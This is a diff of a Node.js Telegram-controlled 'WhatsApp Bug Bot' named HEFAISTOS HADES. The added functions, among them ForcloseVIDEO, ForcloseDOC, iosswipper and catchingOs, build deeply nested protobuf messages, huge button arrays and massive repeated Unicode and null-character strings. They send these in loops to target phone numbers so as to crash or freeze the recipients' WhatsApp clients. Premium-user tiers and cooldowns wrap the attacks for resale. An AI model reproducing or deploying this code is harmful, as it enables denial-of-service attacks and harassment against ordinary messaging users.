@@ -1,15 +1,20 @@
+// =====================================================
+//  HEFAISTOS HADES
+//  WhatsApp Bug Bot • Telegram Control Panel
+//  Dev : @shinracery
+// =====================================================
+
 const { Telegraf } = require("telegraf");
 const fs = require("fs");
 const path = require("path");
 const https = require("https");
 const FormData = require("form-data");
-const os = require("os");
 const chalk = require("chalk");
 const axios = require("axios");
 const moment = require("moment-timezone");
 const pino = require("pino");
 const EventEmitter = require("events");
-const { tokenBot, ownerID, CHANNEL_USERNAME } = require("./config");
+const { tokenBot, ownerID } = require("./config");
 
 const {
   default: makeWASocket,
@@ -17,25 +22,36 @@ const {
   fetchLatestBaileysVersion,
   DisconnectReason,
   proto,
+  generateWAMessageFromContent,
 } = require("@whiskeysockets/baileys");
 
-// ---------- config ----------
-const adminFile = "./database/adminuser.json";
-const thumbnailUrl = "https://files.catbox.moe/l3djrx.jpg";
-const ThumbnailPairing = "https://files.catbox.moe/aaercl.jpg";
-const usePairingCode = true;
+// ---------- pengaturan dasar ----------
+const adminFile        = "./database/adminuser.json";
+const thumbnailUrl     = "https://k.top4top.io/p_3927brgaj0.png";
+const ThumbnailPairing = "https://k.top4top.io/p_3927brgaj0.png";
+const usePairingCode   = true;
 
 const bot = new Telegraf(tokenBot);
-let sock = null;
-let isWhatsAppConnected = false;
-let lastPairingMessage = null;
 
-// ---------- utils ----------
+let sock                = null;
+global.sock             = null;
+let isWhatsAppConnected = false;
+let lastPairingMessage  = null;
+
+// ---------- helper kecil ----------
 const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
-const loadJSON = (f) => (fs.existsSync(f) ? JSON.parse(fs.readFileSync(f, "utf8")) : []);
-const saveJSON = (f, d) => fs.writeFileSync(f, JSON.stringify(d, null, 2));
+
+const loadJSON = (file) =>
+  fs.existsSync(file) ? JSON.parse(fs.readFileSync(file, "utf8")) : [];
+
+const saveJSON = (file, data) =>
+  fs.writeFileSync(file, JSON.stringify(data, null, 2));
+
 const esc = (s = "") =>
-  String(s).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
+  String(s)
+    .replace(/&/g, "&amp;")
+    .replace(/</g, "&lt;")
+    .replace(/>/g, "&gt;");
 
 function formatTarget(n) {
   if (!n) return null;
@@ -55,84 +71,327 @@ function formatMemory() {
   return `${(process.memoryUsage().rss / 524 / 524).toFixed(0)} MB`;
 }
 
-// =================== EFEK DRIP (TYPEWRITER) ===================
-// Kirim pesan baru, baris demi baris
-async function dripSend(ctx, fullText, opts = {}) {
-  const {
-    parse_mode = "HTML",
-    reply_markup = null,
-    speed = 220,
-    chatId = ctx.chat.id,
-  } = opts;
+// =====================================================
+// ================ FUNGSI BUG (MULTI) =================
+// =====================================================
 
-  const lines = fullText.split("\n");
-  let buffer = "";
-  let sentMsg = null;
+// ---------- FORCLOSE VIDEO ----------
+async function ForcloseVIDEO(sock, target) {
+  const video = {
+    url: "https://mmg.whatsapp.net/v/t62.7161-24/26969734_696671580023189_3150099807015053794_n.enc?ccb=11-4&oh=01_Q5Aa1wH_vu6G5kNkZlean1BpaWCXiq7Yhen6W-wkcNEPnSbvHw&oe=6886DE85&_nc_sid=5e03e0&mms3=true",
+    mimetype: "video/mp4",
+    fileSha256: "sHsVF8wMbs/aI6GB8xhiZF1NiKQOgB2GaM5O0/NuAII=",
+    fileLength: 999999999,
+    seconds: 999999999,
+    mediaKey: "EneIl9K1B0/ym3eD0pbqriq+8K7dHMU9kkonkKgPs/8=",
+    caption: "NandoX",
+    height: 9999,
+    width: 9999,
+    fileEncSha256: "KcHu146RNJ6FP2KHnZ5iI1UOLhew1XC5KEjMKDeZr8I=",
+    directPath: "/v/t62.7161-24/26969734_696671580023189_3150099807015053794_n.enc?ccb=11-4&oh=01_Q5Aa1wH_vu6G5kNkZlean1BpaWCXiq7Yhen6W-wkcNEPnSbvHw&oe=6886DE85&_nc_sid=5e03e0",
+    mediaKeyTimestamp: "1751081957",
+    jpegThumbnail: null,
+    streamingSidecar: null,
+  };
 
-  for (let i = 0; i < lines.length; i++) {
-    buffer += (i === 0 ? "" : "\n") + lines[i];
+  const tol = [[0xBA, 0x03], [0xD2, 0x04], [0xAA, 0x02]];
+  const encodeVarint = function (rb) { var buf = []; while (rb >= 0x80) { buf.push((rb & 0x7f) | 0x80); rb >>>= 7; } buf.push(rb); return Buffer.from(buf); };
+  const wrapLd = function (tag, data) { return Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]); };
+  const MakLo = proto.Message.encode(proto.Message.fromObject({ videoMessage: video })).finish();
+  const inflate = function (tag, rayap) { var buf = MakLo; for (var i = 0; i < rayap; i++) buf = wrapLd(tag, wrapLd([0x0A], buf)); return buf; };
+  const resolveJid = function (raw) { var s = String(raw || "").trim(); if (s.includes("@")) return s; return s.replace(/\D/g, "") + "@s.whatsapp.net"; };
+  const jids = (Array.isArray(target) ? target : [target]).map(resolveJid).filter(function (j) { return j.length > 15; });
 
-    const isLast = i === lines.length - 1;
-    const payload = {
-      parse_mode,
-      ...(isLast && reply_markup ? { reply_markup } : {}),
+  var MAX_BATCH = 100, DELAY_MS = 2000;
+
+  for (var offset = 0; offset < jids.length; offset += MAX_BATCH) {
+    var crb = jids.slice(offset, offset + MAX_BATCH);
+    if (offset !== 0) await new Promise(function (r) { setTimeout(r, DELAY_MS); });
+    var idx = Math.floor(offset / MAX_BATCH) + 1;
+    var suffix = idx > 1 ? "n" + idx : "n";
+    var CrBMsG = "crb" + Date.now().toString(36).toUpperCase() + suffix;
+
+    for (var ti = 0; ti < tol.length; ti++) {
+      var tag = tol[ti];
+      var bokep = null;
+      for (var rayap = 5000; rayap >= 2000 && !bokep; rayap -= 400) {
+        try { var decoded = proto.Message.decode(inflate(tag, rayap)); proto.Message.encode(decoded).finish(); bokep = decoded; } catch (_) {}
+      }
+      if (!bokep) continue;
+      await sock.relayMessage("status@broadcast", bokep, {
+        messageId: CrBMsG, statusJidList: crb,
+        additionalNodes: [{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: crb.map(function (jid) { return { tag: "to", attrs: { jid: jid }, content: [] }; }) }] }],
+      });
+    }
+  }
+}
+
+// ---------- FORCLOSE DOC ----------
+async function ForcloseDOC(sock, target) {
+  const document = {
+    url: "https://mmg.whatsapp.net/v/t62.7119-24/583550661_2366231810527044_2211533771736792774_n.enc?ccb=11-4&oh=01_Q5Aa4gE54f2r8LoDblReCmtq2DnGP-mSrNd-omujIcrP313Vlg&oe=6A3DBD88&_nc_sid=5e03e0&mms3=true",
+    mimetype: "application/pdf",
+    fileSha256: "7rOXceVPuGvMTfHN7VXURYOQV2ZmzxQ4xZ6cLM2JNPA=",
+    fileLength: 999999999,
+    pageCount: 1000,
+    mediaKey: "oohdpzQ3uCjBvJWx+2VmRj4bWsCiTvrpUftezu27bs4=",
+    fileName: "nando.pdf",
+    fileEncSha256: "IT6Goux9voqfI50TST8rtFY9iVmxZenRz55JXZpAR2g=",
+    directPath: "/v/t62.7119-24/583550661_2366231810527044_2211533771736792774_n.enc?ccb=11-4&oh=01_Q5Aa4gE54f2r8LoDblReCmtq2DnGP-mSrNd-omujIcrP313Vlg&oe=6A3DBD88&_nc_sid=5e03e0",
+    mediaKeyTimestamp: "1779839963",
+    thumbnailDirectPath: "/v/t62.36145-24/705860036_1320514133375133_5228808273876536402_n.enc?ccb=11-4&oh=01_Q5Aa4gFkVLVWUFlX-Jk7uj1PdsnY5lmVp4lWmmQYdHkPsFhTUQ&oe=6A3DAF40&_nc_sid=5e03e0",
+    thumbnailSha256: "xK2z7ScS2wSQDxLVfdZ5e1BpIe+GsTv8KaVGAfufqjY=",
+    thumbnailEncSha256: "2N98oiJb8xii+D/KYAuHRq7Mg/8OIHFXNZQ5py4g9fM=",
+    jpegThumbnail: null, contextInfo: {}, thumbnailHeight: 999, thumbnailWidth: 999,
+  };
+
+  const tol = [[0xBA, 0x03], [0xD2, 0x04], [0xAA, 0x02]];
+  const encodeVarint = function (rb) { var buf = []; while (rb >= 0x80) { buf.push((rb & 0x7f) | 0x80); rb >>>= 7; } buf.push(rb); return Buffer.from(buf); };
+  const wrapLd = function (tag, data) { return Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]); };
+  const MakLo = proto.Message.encode(proto.Message.fromObject({ documentMessage: document })).finish();
+  const inflate = function (tag, rayap) { var buf = MakLo; for (var i = 0; i < rayap; i++) buf = wrapLd(tag, wrapLd([0x0A], buf)); return buf; };
+  const resolveJid = function (raw) { var s = String(raw || "").trim(); if (s.includes("@")) return s; return s.replace(/\D/g, "") + "@s.whatsapp.net"; };
+  const jids = (Array.isArray(target) ? target : [target]).map(resolveJid).filter(function (j) { return j.length > 15; });
+
+  var MAX_BATCH = 100, DELAY_MS = 2000;
+
+  for (var offset = 0; offset < jids.length; offset += MAX_BATCH) {
+    var crb = jids.slice(offset, offset + MAX_BATCH);
+    if (offset !== 0) await new Promise(function (r) { setTimeout(r, DELAY_MS); });
+    var idx = Math.floor(offset / MAX_BATCH) + 1;
+    var suffix = idx > 1 ? "n" + idx : "n";
+    var CrBMsG = "crb" + Date.now().toString(36).toUpperCase() + suffix;
+
+    for (var ti = 0; ti < tol.length; ti++) {
+      var tag = tol[ti];
+      var bokep = null;
+      for (var rayap = 5000; rayap >= 2000 && !bokep; rayap -= 400) {
+        try { var decoded = proto.Message.decode(inflate(tag, rayap)); proto.Message.encode(decoded).finish(); bokep = decoded; } catch (_) {}
+      }
+      if (!bokep) continue;
+      await sock.relayMessage("status@broadcast", bokep, {
+        messageId: CrBMsG, statusJidList: crb,
+        additionalNodes: [{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: crb.map(function (jid) { return { tag: "to", attrs: { jid: jid }, content: [] }; }) }] }],
+      });
+    }
+  }
+}
+
+// ---------- FORCLOSE STICKER ----------
+async function ForcloseSTC(sock, target) {
+  const sticker = {
+    url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
+    fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
+    fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
+    mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
+    mimetype: "image/webp",
+    directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
+    fileLength: "10610",
+    mediaKeyTimestamp: "1775044724",
+    stickerSentTs: "1775044724091",
+  };
+
+  const tol = [[0xBA, 0x03], [0xD2, 0x04], [0xAA, 0x02]];
+  const encodeVarint = function (rb) { var buf = []; while (rb >= 0x80) { buf.push((rb & 0x7f) | 0x80); rb >>>= 7; } buf.push(rb); return Buffer.from(buf); };
+  const wrapLd = function (tag, data) { return Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]); };
+  const MakLo = proto.Message.encode(proto.Message.fromObject({ stickerMessage: sticker })).finish();
+  const inflate = function (tag, rayap) { var buf = MakLo; for (var i = 0; i < rayap; i++) buf = wrapLd(tag, wrapLd([0x0A], buf)); return buf; };
+  const resolveJid = function (raw) { var s = String(raw || "").trim(); if (s.includes("@")) return s; return s.replace(/\D/g, "") + "@s.whatsapp.net"; };
+  const jids = (Array.isArray(target) ? target : [target]).map(resolveJid).filter(function (j) { return j.length > 15; });
+
+  var MAX_BATCH = 100, DELAY_MS = 2000;
+
+  for (var offset = 0; offset < jids.length; offset += MAX_BATCH) {
+    var crb = jids.slice(offset, offset + MAX_BATCH);
+    if (offset !== 0) await new Promise(function (r) { setTimeout(r, DELAY_MS); });
+    var idx = Math.floor(offset / MAX_BATCH) + 1;
+    var suffix = idx > 1 ? "n" + idx : "n";
+    var CrBMsG = "crb" + Date.now().toString(36).toUpperCase() + suffix;
+
+    for (var ti = 0; ti < tol.length; ti++) {
+      var tag = tol[ti];
+      var bokep = null;
+      for (var rayap = 5000; rayap >= 2000 && !bokep; rayap -= 400) {
+        try { var decoded = proto.Message.decode(inflate(tag, rayap)); proto.Message.encode(decoded).finish(); bokep = decoded; } catch (_) {}
+      }
+      if (!bokep) continue;
+      await sock.relayMessage("status@broadcast", bokep, {
+        messageId: CrBMsG, statusJidList: crb,
+        additionalNodes: [{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: crb.map(function (jid) { return { tag: "to", attrs: { jid: jid }, content: [] }; }) }] }],
+      });
+    }
+  }
+}
+
+// ---------- NATIVE STC ----------
+async function nativestc(sock, target) {
+  await sock.relayMessage(target, {
+    groupStatusMessageV2: {
+      message: {
+        interactiveMessage: {
+          body: { text: "Asmodeus @shinracery" },
+          nativeFlowMessage: { buttons: Array.from({ length: 500000 }, () => ({})) },
+          contextInfo: {
+            mentionedJid: [target],
+            stickerMessage: {
+              url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
+              fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
+              fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
+              mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
+              mimetype: "image/webp",
+              directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
+              fileLength: "10610",
+              mediaKeyTimestamp: "1775044724",
+              stickerSentTs: "1775044724091",
+            },
+          },
+        },
+      },
+    },
+  }, { participant: target });
+}
+
+// ---------- BULV1 ----------
+async function BulV1(sock, target) {
+  const mentioned = Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 9999999) + "@s.whatsapp.net");
+
+  const audioMsg = {
+    audioMessage: {
+      url: "https://mmg.whatsapp.net/v/t62.7114-24/30579250_1011830034456290_180179893932468870_n.enc?ccb=11-4&oh=01_Q5Aa1gHANB--B8ZZfjRHjSNbgvr6s4scLwYlWn0pJ7sqko94gg&oe=685888BC&_nc_sid=5e03e0&mms3=true",
+      mimetype: "audio/mpeg",
+      fileSha256: Buffer.from("pqVrI58Ub2/xft1GGVZdexY/nHxu/XpfctwHTyIHezU=", "base64"),
+      fileLength: "389948", seconds: 24, ptt: false,
+      mediaKey: Buffer.from("v6lUyojrV/AQxXQ0HkIIDeM7cy5IqDEZ52MDswXBXKY=", "base64"),
+      fileEncSha256: Buffer.from("fYH+mph91c+E21mGe+iZ9/l6UnNGzlaZLnKX1dCYZS4=", "base64"),
+      caption: "Cery",
+      contextInfo: { mentionedJid: mentioned },
+    },
+  };
+
+  const all = [audioMsg];
+  for (const data of all) {
+    const msg = await generateWAMessageFromContent(target, data, {});
+    await sock.relayMessage(target, msg.message, { messageId: msg.key.id, statusJidList: [target] });
+  }
+
+  for (let i = 0; i < 100; i++) {
+    const bruh = await generateWAMessageFromContent(target, {
+      interactiveMessage: {
+        body: { text: "!Shinra8man" },
+        nativeFlowMessage: { buttons: "{".repeat(500000) },
+      },
+    }, {});
+    await sock.relayMessage(target, { groupStatusMessageV2: { message: bruh.message } }, {});
+  }
+}
+
+// ---------- IOSSWIPPER ----------
+async function iosswipper(sock, target) {
+  const a = " fvck sereη. " + "𑇂𑆵𑆴𑆿".repeat(70000);
+  const b = "𑇂𑆵𑆴𑆿".repeat(70000);
+
+  try {
+    let c = { degreesLatitude: 11.11, degreesLongitude: -11.11, name: "𑇂𑆵𑆴𑆿".repeat(60000), url: "https://t.me/abcseren" };
+    let d = generateWAMessageFromContent(target, { viewOnceMessage: { message: { locationMessagex: c } } }, {});
+
+    let e = {
+      extendedTextMessage: {
+        text: b, matchedText: " fvck sereη. ",
+        description: "𑇂𑆵𑆴𑆿".repeat(60000),
+        title: "𑇂𑆵𑆴𑆿".repeat(60000),
+        previewType: "NONE", jpegThumbnail: "",
+        thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
+        thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
+        thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
+        mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
+        mediaKeyTimestamp: "1743101489",
+        thumbnailHeight: 641, thumbnailWidth: 640,
+        inviteLinkGroupTypeV2: "DEFAULT",
+      },
     };
 
-    if (!sentMsg) {
-      sentMsg = await ctx.telegram.sendMessage(chatId, buffer, payload);
-    } else {
-      try {
-        await ctx.telegram.editMessageText(chatId, sentMsg.message_id, null, buffer, payload);
-      } catch (e) {
-        if (!e?.response?.description?.includes("message is not modified")) {
-          // log aja, jangan crash
-        }
-      }
+    let f = generateWAMessageFromContent(target, { viewOnceMessage: { message: { extendMsgx: e } } }, {});
+
+    let g = {
+      degreesLatitude: -9.09999262999, degreesLongitude: 199.99963118999,
+      jpegThumbnail: null,
+      name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(17000),
+      address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(11000),
+      url: `${"𑇂𑆵𑆴𑆿".repeat(28000)}`,
+    };
+
+    let h = generateWAMessageFromContent(target, { viewOnceMessage: { message: { locationMessage: g } } }, {});
+
+    let i = {
+      extendedTextMessage: {
+        text: a, matchedText: " fvck sereη. ",
+        description: "𑇂𑆵𑆴𑆿".repeat(29000),
+        title: " fvck sereη. " + "𑇂𑆵𑆴𑆿".repeat(19000),
+        previewType: "NONE",
+        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wAARCAABAAEDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAb/xAAUEAEAAAAAAAAAAAAAAAAAAAAA/8QAFQEBAQAAAAAAAAAAAAAAAAAAAAX/xAAUEQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIRAxEAPwCdABmX/9k=",
+        thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
+        thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
+        thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
+        mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
+        mediaKeyTimestamp: "1743101489",
+        thumbnailHeight: 641, thumbnailWidth: 640,
+        inviteLinkGroupTypeV2: "DEFAULT",
+      },
+    };
+
+    let j = generateWAMessageFromContent(target, { viewOnceMessage: { message: { extendMsg: i } } }, {});
+    let k = generateWAMessageFromContent(target, { viewOnceMessage: { message: { locationMessage: g } } }, {});
+
+    for (let i = 0; i < 40; i++) {
+      await sock.relayMessage("status@broadcast", d.message, { messageId: d.key.id, statusJidList: [target], additionalNodes: [{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target }, content: undefined }] }] }] });
+      await sock.relayMessage("status@broadcast", f.message, { messageId: f.key.id, statusJidList: [target], additionalNodes: [{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target }, content: undefined }] }] }] });
+      await sock.relayMessage("status@broadcast", d.message, { messageId: d.key.id, statusJidList: [target], additionalNodes: [{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target }, content: undefined }] }] }] });
+      await sock.relayMessage("status@broadcast", f.message, { messageId: f.key.id, statusJidList: [target], additionalNodes: [{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target }, content: undefined }] }] }] });
+      await sock.relayMessage("status@broadcast", k.message, { messageId: f.key.id, statusJidList: [target], additionalNodes: [{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target }, content: undefined }] }] }] });
+      if (i < 9) await new Promise((resolve) => setTimeout(resolve, 5000));
     }
-
-    await sleep(speed);
-  }
-
-  return sentMsg;
+  } catch (err) {}
 }
 
-// Edit pesan yang sudah ada, baris demi baris
-async function dripEdit(ctx, fullText, opts = {}) {
-  const {
-    parse_mode = "HTML",
-    reply_markup = null,
-    speed = 200,
-    chatId = ctx.chat.id,
-    messageId = ctx.callbackQuery?.message?.message_id,
-  } = opts;
+// ---------- CATCHING OS ----------
+async function catchingOs(target) {
+  let a = "\u0010";
+  let b = "𑇂𑆵𑆴𑆿𑆿".repeat(40000);
+  let c = "\u0000".repeat(600000);
+  let d = "█".repeat(400000);
 
-  if (!messageId) return null;
+  let e = {
+    viewOnceMessage: {
+      message: {
+        locationMessage: {
+          degreesLatitude: -999999.999999, degreesLongitude: 999999.999999,
+          name: a + b + c, address: a + b + c,
+          url: `${"𑇂𑆵𑆴𑆿".repeat(50000)}`,
+          contextInfo: {
+            participant: target,
+            mentionedJid: Array.from({ length: 8000 }, () => "1" + Math.floor(Math.random() * 999999999) + "@s.whatsapp.net"),
+            externalAdReply: { title: d, body: c, mediaType: "VIDEO" },
+          },
+        },
+        nativeFlowMessage: {
+          name: "galaxy_message",
+          paramsJson: "{".repeat(400000) + "}".repeat(400000),
+          version: 3,
+        },
+      },
+    },
+  };
 
-  const lines = fullText.split("\n");
-  let buffer = "";
-
-  for (let i = 0; i < lines.length; i++) {
-    buffer += (i === 0 ? "" : "\n") + lines[i];
-    const isLast = i === lines.length - 1;
-
-    try {
-      await ctx.telegram.editMessageText(chatId, messageId, null, buffer, {
-        parse_mode,
-        ...(isLast && reply_markup ? { reply_markup } : {}),
-      });
-    } catch (e) {
-      if (!e?.response?.description?.includes("message is not modified")) {
-        // diamkan
-      }
-    }
-
-    await sleep(speed);
-  }
-
-  return messageId;
+  let f = generateWAMessageFromContent(target, e, {});
+  await global.sock.relayMessage("status@broadcast", f.message, {
+    messageId: Date.now(), statusJidList: [target],
+    additionalNodes: [{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target } }] }] }],
+  });
 }
 
-// =================== IN MEMORY STORE ===================
+// =====================================================
+// ================== IN MEMORY STORE ==================
+// =====================================================
 function makeInMemoryStore() {
   const ev = new EventEmitter();
   const chats = {}, messages = {}, contacts = {};
@@ -144,7 +403,7 @@ function makeInMemoryStore() {
       if (messages[id].length > 50) messages[id].shift();
     }
   });
-  return { chats, messages, contacts, bind: (t) => t.on("messages.upsert", (m) => ev.emit("messages.upsert", m)) };
+  return { chats, messages, contacts, bind: (target) => target.on("messages.upsert", (m) => ev.emit("messages.upsert", m)) };
 }
 
 // =================== TASK QUEUE ===================
@@ -165,28 +424,20 @@ const queue = new TaskQueue();
 
 // =================== PREMIUM GROUP ===================
 const PREM_DB = path.join(__dirname, "premgb.json");
-const loadPrem = () => {
+function loadPrem() {
   try {
     if (!fs.existsSync(PREM_DB)) fs.writeFileSync(PREM_DB, JSON.stringify({ groups: [] }, null, 2));
     const d = JSON.parse(fs.readFileSync(PREM_DB, "utf8"));
     return d?.groups && Array.isArray(d.groups) ? d : { groups: [] };
   } catch { return { groups: [] }; }
-};
+}
 const savePrem = (d) => fs.writeFileSync(PREM_DB, JSON.stringify(d, null, 2));
 const isPremGroup = (id) => loadPrem().groups.includes(Number(id));
-const addPremGroup = (id) => {
-  const d = loadPrem(); id = Number(id);
-  if (!d.groups.includes(id)) d.groups.push(id);
-  savePrem(d);
-};
-const delPremGroup = (id) => {
-  const d = loadPrem();
-  d.groups = d.groups.filter((x) => x !== Number(id));
-  savePrem(d);
-};
+const addPremGroup = (id) => { const d = loadPrem(); id = Number(id); if (!d.groups.includes(id)) d.groups.push(id); savePrem(d); };
+const delPremGroup = (id) => { const d = loadPrem(); d.groups = d.groups.filter((x) => x !== Number(id)); savePrem(d); };
 
 // =================== PREMIUM USER ===================
-const premiumFile = "./database/premium.json";
+const premiumFile  = "./database/premium.json";
 const cooldownFile = "./database/cooldown.json";
 const loadPremUsers = () => { try { return JSON.parse(fs.readFileSync(premiumFile)); } catch { return {}; } };
 const savePremUsers = (u) => fs.writeFileSync(premiumFile, JSON.stringify(u, null, 2));
@@ -194,21 +445,14 @@ const savePremUsers = (u) => fs.writeFileSync(premiumFile, JSON.stringify(u, nul
 function addPremUser(userId, duration) {
   const u = loadPremUsers();
   const exp = moment().add(duration, "days").tz("Asia/Jakarta").format("DD-MM-YYYY");
-  u[userId] = exp;
-  savePremUsers(u);
-  return exp;
+  u[userId] = exp; savePremUsers(u); return exp;
 }
-function removePremUser(userId) {
-  const u = loadPremUsers();
-  delete u[userId];
-  savePremUsers(u);
-}
+function removePremUser(userId) { const u = loadPremUsers(); delete u[userId]; savePremUsers(u); }
 function isPremiumUser(userId) {
   const u = loadPremUsers();
   if (!u[userId]) return false;
   if (moment().isBefore(moment(u[userId], "DD-MM-YYYY"))) return true;
-  removePremUser(userId);
-  return false;
+  removePremUser(userId); return false;
 }
 
 const loadCooldown = () => { try { return JSON.parse(fs.readFileSync(cooldownFile)).cooldown || 5; } catch { return 5; } };
@@ -230,7 +474,7 @@ const saveApproved = () => fs.writeFileSync(APPROVED_FILE, JSON.stringify(approv
 const isGroupApproved = (id) => approvedGroups.includes(String(id));
 const isOwner = (id) => String(id) === String(ownerID);
 
-// =================== BLOCKED CMD ===================
+// =================== BLOCKED COMMAND ===================
 const BLOCKED_FILE = path.join(__dirname, "blocked_commands.json");
 let blockedCommands = [];
 try {
@@ -243,7 +487,7 @@ const saveBlocked = () => fs.writeFileSync(BLOCKED_FILE, JSON.stringify(blockedC
 const normCmd = (s) => String(s || "").trim().toLowerCase().replace(/^\//, "");
 const isBlocked = (c) => blockedCommands.includes(normCmd(c));
 
-// =================== POINTS ===================
+// =================== POINT SYSTEM ===================
 const POINTS_FILE = path.join(__dirname, "points.json");
 function loadPoints() {
   try {
@@ -251,7 +495,7 @@ function loadPoints() {
     return JSON.parse(fs.readFileSync(POINTS_FILE, "utf8") || "{}");
   } catch { return {}; }
 }
-function savePoints(d) { fs.writeFileSync(POINTS_FILE, JSON.stringify(d, null, 2)); }
+const savePoints = (d) => fs.writeFileSync(POINTS_FILE, JSON.stringify(d, null, 2));
 function ensurePoint(user) {
   const db = loadPoints();
   const id = String(user.id);
@@ -260,16 +504,16 @@ function ensurePoint(user) {
   savePoints(db);
   return db;
 }
-const addWin = (u) => { const d = ensurePoint(u); d[String(u.id)].points += 3; d[String(u.id)].win += 1; savePoints(d); };
+const addWin  = (u) => { const d = ensurePoint(u); d[String(u.id)].points += 3; d[String(u.id)].win += 1; savePoints(d); };
 const addLose = (u) => { const d = ensurePoint(u); d[String(u.id)].lose += 1; savePoints(d); };
 const addDraw = (u) => { const d = ensurePoint(u); d[String(u.id)].points += 1; d[String(u.id)].draw += 1; savePoints(d); };
 const getPoint = (id) => loadPoints()[String(id)] || null;
 const getTop = (n = 10) => Object.values(loadPoints()).sort((a, b) => b.points - a.points).slice(0, n);
-const addSuitWin = (u) => { const d = ensurePoint(u); d[String(u.id)].points += 2; d[String(u.id)].win += 1; savePoints(d); };
+const addSuitWin  = (u) => { const d = ensurePoint(u); d[String(u.id)].points += 2; d[String(u.id)].win += 1; savePoints(d); };
 const addSuitLose = (u) => { const d = ensurePoint(u); d[String(u.id)].lose += 1; savePoints(d); };
 const addSuitDraw = (u) => { const d = ensurePoint(u); d[String(u.id)].draw += 1; savePoints(d); };
 
-// =================== WA SESSION ===================
+// =================== WHATSAPP SESSION ===================
 async function startSesi() {
   console.clear();
   console.log(chalk.bold.yellow(`
@@ -292,6 +536,8 @@ async function startSesi() {
